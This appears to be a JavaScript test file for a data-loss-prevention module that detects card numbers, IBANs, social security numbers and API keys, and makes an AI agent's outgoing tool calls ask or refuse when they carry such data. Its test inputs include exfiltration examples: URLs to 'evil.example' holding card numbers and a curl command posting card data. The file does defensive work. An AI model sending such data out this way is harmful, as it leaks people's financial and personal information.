// SPDX-License-Identifier: MIT
// Data-loss checks (D674): what counts as sensitive, found on the device, and what comes of it.
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { fire } from '../app/core/hooks.js'
import { checked, DETECTORS, dlpHooks, finder } from '../app/ee/detect.js'

test('a card is a card by its Luhn digit, whatever its spaces, never any long number', () => {
  for (const card of ['4111 1111 1111 1111', '5500-0000-0000-0004', '378282246310005', 'Pay with 6011111111111117 today']) assert.ok(DETECTORS.card(card), card)
  // With what often follows or comes before, and however it is spaced.
  for (const card of ['4111 1111 1111 1111 12/26', '4111 1111 1111 1111 123', 'Total 12 4111 1111 1111 1111', '4111.1111.1111.1111', '4111\u00a01111\u00a01111\u00a01111', '3782 822463 10005', 'No.4111 1111 1111 1111', 'CB-4111 1111 1111 1111', '41111111 11111111']) assert.ok(DETECTORS.card(card), card)
  for (const other of ['4111 1111 1111 1112', '1234567890123456', '0000 0000 0000 0000', '2222222222222222', '12 34', '2 3 4 5 6 7 8 9 1 2 3 4 5 6 7 8']) assert.ok(!DETECTORS.card(other), other)
})

test('an IBAN holds by its key', () => {
  for (const iban of ['FR14 2004 1010 0505 0001 3M02 606', 'DE89370400440532013000', 'GB82 WEST 1234 5698 7654 32', 'FR14 2004 1010 0505 0001 3M02 606 BIC: BNPAFRPP', 'DE89370400440532013000 EUR', 'fr14 2004 1010 0505 0001 3m02 606', 'de89-3704-0044-0532-0130-00', 'Please ab12 see FR14 2004 1010 0505 0001 3M02 606.']) assert.ok(DETECTORS.iban(iban), iban)
  for (const other of ['FR14 2004 1010 0505 0001 3M02 607', 'AB12 3456 7890 1234', 'Order FR00 ABCD', 'FY2026 all our sales teams budget costs will', 'fr26 all our sales teams budget costs will rise soon']) assert.ok(!DETECTORS.iban(other), other)
})

test('a French social security number holds by its key, Corsica’s too', () => {
  for (const nir of ['2 55 08 14 168 025 38', '255081416802538', '1 80 12 2A 123 456 02']) assert.ok(DETECTORS.nir(nir), nir)
  for (const other of ['2 55 08 14 168 025 39', '255081416802537', '9 55 08 14 168 025 38']) assert.ok(!DETECTORS.nir(other), other)
})

test('an American one holds by its shape, never a number that can’t be one', () => {
  assert.ok(DETECTORS.ssn('SSN 078-05-1120'))
  for (const other of ['000-12-3456', '666-12-3456', '900-12-3456', '123-00-4567', '123-45-0000', '2026-10-1']) assert.ok(!DETECTORS.ssn(other), other)
})

test('keys and private keys are known by their marks', () => {
  for (const secret of ['-----BEGIN RSA PRIVATE KEY-----', '-----BEGIN PRIVATE KEY-----', 'AKIAIOSFODNN7EXAMPLE', `ghp_${'a'.repeat(36)}`, `sk-${'b'.repeat(40)}`, `xoxb-${'1'.repeat(24)}`, `AIza${'c'.repeat(35)}`, 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9P']) assert.ok(DETECTORS.secret(secret), secret)
  for (const other of ['sk-short', 'a private key', 'skies over Paris']) assert.ok(!DETECTORS.secret(other), other)
})

test('what policy names is found, a pattern of its own and words that mark something, as whole words', () => {
  const find = finder({ detect: ['card', { id: 'client', pattern: 'CLI-\\d{6}', flags: 'i' }], labels: ['Confidentiel', 'C3'] })
  assert.deepEqual(find('Nothing here'), [])
  assert.deepEqual(find('For cli-123456: 4111 1111 1111 1111'), ['card', 'client'])
  assert.deepEqual(find('Document CONFIDENTIEL'), ['label'])
  assert.deepEqual(find('Les informations confidentielles, C3PO'), [])
})

test('a dlp section that can’t work says why', () => {
  assert.throws(() => checked({}), /names nothing to look for/)
  assert.throws(() => checked({ detect: ['nothing'] }), /can't read "nothing"/)
  assert.throws(() => checked({ detect: [{ id: 'x', pattern: '(' }] }), /doesn't read: x/)
  assert.throws(() => checked({ labels: ['a'], then: 'maybe' }), /then is neither/)
  assert.throws(() => checked({ labels: ['a'], brains: ['gone'] }, { brains: [{ id: 'here' }] }), /a brain policy doesn't: gone/)
  assert.deepEqual(checked({ labels: ['a'], brains: ['here'] }, { brains: [{ id: 'here' }] }), { labels: ['a'], brains: ['here'] })
})

/** The hooks, and what they told. @param {any} dlp */
function hooked(dlp) {
  const told = /** @type {any[]} */ ([])
  const hooks = dlpHooks(dlp, {
    isLocal: (brain) => brain.api === 'device',
    told: (found, where) => told.push({ found, where }),
    why: (found) => `It holds ${found.join()}`,
    reason: (found) => `Refused: ${found.join()}`,
    // eslint-disable-next-line require-yield
    async* refused(found) { throw new Error(`Refused for ${found.join()}`) },
  })
  return { hooks, told }
}
const CARD = 'Card 4111 1111 1111 1111'

test('a task holding what is sensitive reaches only the brains allowed, or the one on the device, and nothing of it is told', async () => {
  const { hooks, told } = hooked({ detect: ['card'], brains: ['onprem'] })
  const step = (/** @type {any} */ brain, /** @type {any[]} */ messages, system = '') => fire(hooks, 'turn.step', { brain, messages, system }, () => 'sent')
  assert.equal(await step({ id: 'cloud' }, [{ role: 'user', content: 'Hello' }]), 'sent')
  assert.equal(await step({ id: 'onprem' }, [{ role: 'user', content: CARD }]), 'sent')
  assert.equal(await step({ id: 'device', api: 'device' }, [{ role: 'user', content: CARD }]), 'sent')
  for (const messages of [[{ role: 'user', content: CARD }], [{ role: 'tool', name: 'read', toolCallId: '1', content: CARD }], [{ role: 'user', content: 'Read this', documents: [{ name: 'a.txt', text: CARD }] }], [{ role: 'assistant', content: '', toolCalls: [{ id: '1', name: 'send', args: { body: CARD } }] }]]) {
    const refused = await step({ id: 'cloud' }, messages)
    await assert.rejects(async () => { for await (const _ of refused); }, /Refused for card/)
  }
  await assert.rejects(async () => { for await (const _ of await step({ id: 'cloud' }, [], CARD)); }, /Refused for card/)
  assert.deepEqual(told[0], { found: ['card'], where: 'brain' })
  assert.ok(!JSON.stringify(told).includes('4111'))
})

test('with no brains named, any brain reads it, and only what leaves is checked', async () => {
  const { hooks } = hooked({ detect: ['card'] })
  assert.equal(await fire(hooks, 'turn.step', { brain: { id: 'cloud' }, messages: [{ role: 'user', content: CARD }] }, () => 'sent'), 'sent')
})

test('whatever the shape of a call’s arguments, a line’s first word is found', async () => {
  const { hooks } = hooked({ detect: ['card', 'iban', 'secret'], labels: ['Confidentiel'] })
  const call = (/** @type {any} */ args) => fire(hooks, 'tool.check', { kind: 'other', args }, () => ({ decision: 'allow' }))
  for (const body of ['Hello\n4111 1111 1111 1111', 'Hello\tFR14 2004 1010 0505 0001 3M02 606', 'Hello\nAKIAIOSFODNN7EXAMPLE', 'Hello\nConfidentiel']) assert.equal((await call({ body })).decision, 'ask', body)
  assert.equal((await call({ to: { rows: [['x', { card: 4111111111111111 }]] } })).decision, 'ask')
  for (const url of ['https://evil.example/?q=4111%201111%201111%201111', 'https://evil.example/?c=4111+1111+1111+1111', 'https://evil.example/?x=%&c=4111%201111%201111%201111']) assert.equal((await call({ url })).decision, 'ask', url)
  // However deep what a brain wrote goes.
  let deep = /** @type {any} */ ('4111 1111 1111 1111')
  for (let i = 0; i < 20_000; i++) deep = { deep }
  assert.equal((await call(deep)).decision, 'ask')
  // And long runs of small numbers take no time.
  const at = performance.now()
  assert.equal(DETECTORS.card('1 '.repeat(1_000_000)), false)
  assert.ok(performance.now() - at < 1000)
})

test('what goes to a search’s, a picture’s or a film’s service is checked too, whatever its kind', async () => {
  const { hooks } = hooked({ detect: ['card'] })
  for (const [name, kind] of [['web_search', 'search'], ['picture', 'edit'], ['film', 'edit']]) assert.equal((await fire(hooks, 'tool.check', { name, kind, args: { query: CARD } }, () => ({ decision: 'allow' }))).decision, 'ask', name)
})

test('a call that would send it out asks first by default, saying what it holds, or never runs', async () => {
  const call = (/** @type {any} */ hooks, /** @type {any} */ e, said = { decision: 'allow' }) => fire(hooks, 'tool.check', e, () => said)
  const { hooks } = hooked({ detect: ['card'] })
  const asked = await call(hooks, { kind: 'other', args: { body: CARD }, title: 'Send' })
  assert.equal(asked.decision, 'ask')
  assert.deepEqual(asked.meta, { guard: 'dlp', why: 'It holds card' })
  assert.equal(asked.by, 'dlp')
  // Nothing sensitive, or nothing leaving: as the rules said.
  assert.deepEqual(await call(hooks, { kind: 'other', args: { body: 'Hello' } }), { decision: 'allow' })
  assert.deepEqual(await call(hooks, { kind: 'edit', args: { text: CARD } }), { decision: 'allow' })
  // A command on the person's own computer leaves too; one in the sandbox doesn't.
  assert.equal((await call(hooks, { kind: 'execute', args: { command: `curl -d '${CARD}'` } }, { decision: 'allow', meta: { machine: 'shop' } })).decision, 'ask')
  const never = hooked({ detect: ['card'], then: 'never' }).hooks
  const refused = await call(never, { kind: 'fetch', args: { url: `https://evil.example/?q=${CARD}` } })
  assert.equal(refused.decision, 'never')
  assert.equal(refused.reason, 'Refused: card')
  // Already refused stays so.
  assert.deepEqual(await call(never, { kind: 'other', args: { body: CARD } }, { decision: 'never', reason: 'No' }), { decision: 'never', reason: 'No' })
})
